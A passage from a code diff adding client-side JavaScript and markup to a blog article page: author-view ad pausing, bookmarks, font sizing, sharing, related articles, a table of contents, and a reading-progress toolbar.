+          document.getElementById('post-content').parentNode.insertBefore(authorNotice, document.getElementById('post-content'));
+        }
+      }
+    } else if (isAuthor) {
+      // Author viewing their own published article: pause ads and view counting
+      document.querySelectorAll('.ad-slot').forEach(function(el) { el.style.display = 'none'; });
+      var authorNotice = document.createElement('div');
+      authorNotice.style.cssText = 'background:var(--paper-2);border:1px solid var(--line);color:var(--ink);padding:1rem 1.5rem;border-radius:8px;margin:1.5rem 0 1rem 0;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:0.75rem';
+      authorNotice.innerHTML = '<span>🔒 <strong>Author View:</strong> Ads &amp; view counts are paused for your own session to protect AdSense compliance.</span> <a href="/author-dashboard" style="color:var(--accent);font-weight:600;text-decoration:underline">Go to Dashboard &rarr;</a>';
+      var grid = document.querySelector('.reader-grid');
+      if (grid && grid.parentNode) {
+        grid.parentNode.insertBefore(authorNotice, grid);
+      } else {
+        document.getElementById('post-content').parentNode.insertBefore(authorNotice, document.getElementById('post-content'));
+      }
+    } else {
+      // Legitimate public reader viewing published post
+      ZebBlog.trackVerifiedView(post.id);
+    }
+
+    // 1. Sync Bookmarking & Attach Listeners
+    var floatingBmBtn = document.getElementById('reader-btn-bookmark');
+    if (floatingBmBtn && isBm) {
+      floatingBmBtn.classList.add('is-bookmarked');
+      floatingBmBtn.setAttribute('title', 'Remove bookmark');
+    }
+
+    function syncBookmarkState(added) {
+      var inlineBm = document.getElementById('post-byline-bm');
+      if (inlineBm) {
+        var span = inlineBm.querySelector('span');
+        if (added) {
+          inlineBm.classList.add('is-bookmarked');
+          if (span) span.textContent = 'Saved';
+          inlineBm.setAttribute('title', 'Remove bookmark');
+        } else {
+          inlineBm.classList.remove('is-bookmarked');
+          if (span) span.textContent = 'Save';
+          inlineBm.setAttribute('title', 'Save article for later');
+        }
+      }
+      if (floatingBmBtn) {
+        if (added) {
+          floatingBmBtn.classList.add('is-bookmarked');
+          floatingBmBtn.setAttribute('title', 'Remove bookmark');
+        } else {
+          floatingBmBtn.classList.remove('is-bookmarked');
+          floatingBmBtn.setAttribute('title', 'Save article for later');
+        }
+      }
+      if (added) {
+        showToast('🔖 Article saved! View it anytime in the <a href="/blog" style="color:var(--accent);text-decoration:underline">Saved tab</a>');
+      } else {
+        showToast('Article removed from saved reading list.');
+      }
+    }
+
+    function handleBookmarkClick(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      var added = toggleBookmarkSafe(post.slug);
+      syncBookmarkState(added);
+    }
+
+    var inlineBmBtn = document.getElementById('post-byline-bm');
+    if (inlineBmBtn) {
+      inlineBmBtn.addEventListener('click', handleBookmarkClick);
+    }
+
+    if (floatingBmBtn) {
+      floatingBmBtn.addEventListener('click', handleBookmarkClick);
+    }
+
+    // 2. Font Size Adjuster Mode
+    var savedFontSize = 'md';
+    try { savedFontSize = localStorage.getItem('zebmalik_reader_fontsize') || 'md'; } catch(_) {}
+    document.body.classList.remove('reading-size-sm', 'reading-size-md', 'reading-size-lg');
+    document.body.classList.add('reading-size-' + savedFontSize);
+
+    var fontBtn = document.getElementById('reader-btn-font');
+    if (fontBtn) {
+      fontBtn.addEventListener('click', function () {
+        var current = 'md';
+        if (document.body.classList.contains('reading-size-sm')) current = 'sm';
+        else if (document.body.classList.contains('reading-size-lg')) current = 'lg';
+
+        var next = (current === 'md') ? 'lg' : (current === 'lg' ? 'sm' : 'md');
+        document.body.classList.remove('reading-size-sm', 'reading-size-md', 'reading-size-lg');
+        document.body.classList.add('reading-size-' + next);
+        try { localStorage.setItem('zebmalik_reader_fontsize', next); } catch(_) {}
+      });
+    }
+
+    // 3. Floating Bar Share & Scroll-to-Top Handlers
+    var floatingShareBtn = document.getElementById('reader-btn-share');
+    if (floatingShareBtn) {
+      floatingShareBtn.addEventListener('click', function () {
+        if (navigator.share) {
+          navigator.share({
+            title: post.title,
+            text: post.excerpt || post.title,
+            url: window.location.href
+          }).catch(function () {});
+        } else {
+          shareArticle('copy');
+        }
+      });
+    }
+
+    var floatingTopBtn = document.getElementById('reader-btn-top');
+    if (floatingTopBtn) {
+      floatingTopBtn.addEventListener('click', function () {
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      });
+    }
+
+    // 4. Load Recommended Next Reads (Related Articles)
+    try {
+      if (typeof ZebBlog !== 'undefined' && ZebBlog.fetchPublishedPosts && ZebBlog.getRelatedPosts) {
+        ZebBlog.fetchPublishedPosts(20).then(function (allPosts) {
+          var related = ZebBlog.getRelatedPosts(post, allPosts, 3);
+          if (related && related.length) {
+            var grid = document.getElementById('related-cards-grid');
+            if (grid) {
+              grid.innerHTML = '';
+              related.forEach(function (rel) {
+                var card = document.createElement('a');
+                card.href = '/post?slug=' + encodeURIComponent(rel.slug);
+                card.className = 'related-card';
+                card.innerHTML = 
+                  '<div class="related-card-meta">' +
+                    '<span>' + (rel.category_icon || '📚') + ' ' + (rel.category_label || 'Engineering') + '</span>' +
+                    '<span>&middot;</span>' +
+                    '<span>' + (rel.read_minutes || 5) + ' min</span>' +
+                  '</div>' +
+                  '<h4 class="related-card-title">' + rel.title + '</h4>' +
+                  '<p class="related-card-excerpt">' + (rel.excerpt || 'Read the full engineering deep dive...') + '</p>' +
+                  '<div class="related-card-footer">' +
+                    '<span>By ' + (rel.profiles ? rel.profiles.full_name : 'Contributor') + '</span>' +
+                    '<span style="color:var(--accent);font-weight:600">Read &rarr;</span>' +
+                  '</div>';
+                grid.appendChild(card);
+              });
+              var sec = document.getElementById('related-articles-section');
+              if (sec) sec.style.display = 'block';
+            }
+          }
+        });
+      }
+    } catch (_) {}
+
+  } catch (err) {
+    console.error('Error loading article:', err);
+    document.getElementById('post-content').innerHTML = '<p class="is-error">Unable to connect to database. Please check your Supabase credentials in blog-config.js.</p>';
+  }
+});
+
+/* Wikipedia-style TOC & Interactive Features */
+function toggleToc(btn) {
+  var list = document.getElementById('toc-list');
+  var header = document.querySelector('.toc-header');
+  if (!list) return;
+  var isHidden = (list.style.display === 'none' || getComputedStyle(list).display === 'none');
+  if (isHidden) {
+    list.style.display = 'flex';
+    if (btn) btn.textContent = '[hide]';
+    if (header) header.classList.add('open');
+  } else {
+    list.style.display = 'none';
+    if (btn) btn.textContent = '[show]';
+    if (header) header.classList.remove('open');
+  }
+}
+
+function shareArticle(type) {
+  var url = encodeURIComponent(window.location.href);
+  var title = encodeURIComponent(document.title);
+  if (type === 'twitter') {
+    window.open('https://twitter.com/intent/tweet?text=' + title + '&url=' + url, '_blank');
+  } else if (type === 'linkedin') {
+    window.open('https://www.linkedin.com/sharing/share-offsite/?url=' + url, '_blank');
+  } else if (type === 'copy') {
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(window.location.href).then(function() {
+        alert('Article link copied to clipboard!');
+      });
+    }
+  }
+}
+
+function buildTableOfContents() {
+  var content = document.getElementById('post-content');
+  if (!content) return;
+  var headings = content.querySelectorAll('h2, h3');
+  var tocList = document.getElementById('toc-list');
+  var tocContainer = document.getElementById('toc-container');
+  var grid = document.querySelector('.reader-grid');
+  if (!tocList) return;
+  tocList.innerHTML = '';
+
+  if (!headings.length) {
+    if (tocContainer) tocContainer.style.display = 'none';
+    if (grid) grid.classList.add('no-toc');
+    return;
+  }
+  if (tocContainer) tocContainer.style.display = 'block';
+  if (grid) grid.classList.remove('no-toc');
+
+  // On mobile screens (<= 980px), collapse by default so user can read directly
+  var isMobile = window.innerWidth <= 980;
+  var header = document.querySelector('.toc-header');
+  var toggleBtn = document.querySelector('.toc-toggle');
+  if (isMobile) {
+    tocList.style.display = 'none';
+    if (toggleBtn) toggleBtn.textContent = '[show]';
+    if (header) header.classList.remove('open');
+  } else {
+    tocList.style.display = 'flex';
+    if (toggleBtn) toggleBtn.textContent = '[hide]';
+    if (header) header.classList.add('open');
+  }
+
+  // Add (Top) item like Wikipedia
+  var topLink = document.createElement('a');
+  topLink.href = '#post-title';
+  topLink.className = 'toc-item toc-top active';
+  topLink.textContent = '(Top)';
+  topLink.onclick = function(e) {
+    e.preventDefault();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+    if (window.innerWidth <= 980) {
+      toggleToc(document.querySelector('.toc-toggle'));
+    }
+  };
+  tocList.appendChild(topLink);
+
+  headings.forEach(function(h, idx) {
+    if (!h.id) {
+      h.id = 'sec-' + idx + '-' + h.textContent.trim().toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');
+    }
+    var a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.className = 'toc-item toc-' + h.tagName.toLowerCase();
+    a.textContent = h.textContent.trim();
+    a.onclick = function(e) {
+      e.preventDefault();
+      var target = document.getElementById(h.id);
+      if (target) {
+        var isMobile = window.innerWidth <= 980;
+        var yOffset = isMobile ? -75 : -90;
+        var y = target.getBoundingClientRect().top + window.pageYOffset + yOffset;
+        window.scrollTo({ top: y, behavior: 'smooth' });
+        if (isMobile) {
+          toggleToc(document.querySelector('.toc-toggle'));
+        }
+      }
+    };
+    tocList.appendChild(a);
+  });
+}
+
+window.addEventListener('scroll', function() {
+  // Reading Progress Bar
+  var winScroll = window.scrollY;
+  var height = document.documentElement.scrollHeight - window.innerHeight;
+  var scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+  var prog = document.getElementById('read-progress-fill');
+  if (prog) prog.style.width = scrolled + '%';
+  var topProg = document.getElementById('reading-progress-bar') || document.getElementById('read-top-progress');
+  if (topProg) topProg.style.width = scrolled + '%';
+
+  // Dynamic Time Left & Floating Reader Bar Visibility
+  var floatingBar = document.getElementById('floating-reader-bar');
+  var barTimeEl = document.getElementById('reader-bar-time');
+  var topBtn = document.getElementById('reader-btn-top');
+
+  if (floatingBar) {
+    if (winScroll > 220) {
+      floatingBar.style.display = 'flex';
+    } else {
+      floatingBar.style.display = 'none';
+    }
+  }
+
+  if (topBtn) {
+    topBtn.style.display = (winScroll > 450) ? 'inline-flex' : 'none';
+  }
+
+  if (barTimeEl) {
+    var totalM = window.currentPostReadMinutes || 5;
+    var rem = Math.max(1, Math.ceil(totalM * (1 - (scrolled / 100))));
+    if (scrolled >= 95) {
+      barTimeEl.textContent = 'Finished 🎉';
+    } else {
+      barTimeEl.textContent = rem + ' min left';
+    }
+  }
+
+  // Scroll Spy for TOC
+  var content = document.getElementById('post-content');
+  if (!content) return;
+  var headings = content.querySelectorAll('h2, h3');
+  var scrollPos = window.scrollY + 120;
+  var currentId = '';
+
+  if (window.scrollY < 200) {
+    currentId = 'post-title';
+  } else {
+    headings.forEach(function(h) {
+      if (h.offsetTop <= scrollPos) {
+        currentId = h.id;
+      }
+    });
+  }
+
+  document.querySelectorAll('.toc-item').forEach(function(link) {
+    if (currentId === 'post-title' && link.classList.contains('toc-top')) {
+      link.classList.add('active');
+    } else if (currentId && link.getAttribute('href') === '#' + currentId) {
+      link.classList.add('active');
+    } else {
+      link.classList.remove('active');
+    }
+  });
+}, { passive: true });
+</script>
+
+<!-- Floating Reader Quick Actions Bar -->
+<div id="floating-reader-bar" class="floating-reader-bar" style="display:none" role="toolbar" aria-label="Reader quick actions">
+  <span class="reader-time-left" id="reader-bar-time">5 min left</span>
+  <span class="reader-bar-sep"></span>
+  <button class="reader-action-btn" id="reader-btn-font" type="button" title="Cycle font size (Default / Medium / Large)" aria-label="Cycle font size">
+    <span style="font-weight:700;font-size:12px;font-family:var(--sans)">A<sup style="font-size:9px">+</sup></span>
+  </button>
+  <button class="reader-action-btn btn-bookmark" id="reader-btn-bookmark" type="button" title="Save article for later" aria-label="Bookmark article">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+  </button>
+  <button class="reader-action-btn" id="reader-btn-share" type="button" title="Share article link" aria-label="Share article">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
+  </button>
+  <button class="reader-action-btn" id="reader-btn-top" type="button" title="Back to top" aria-label="Scroll to top" style="display:none">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 15l-6-6-6 6"/></svg>
+  </button>
+</div>
+</body>
+</html>
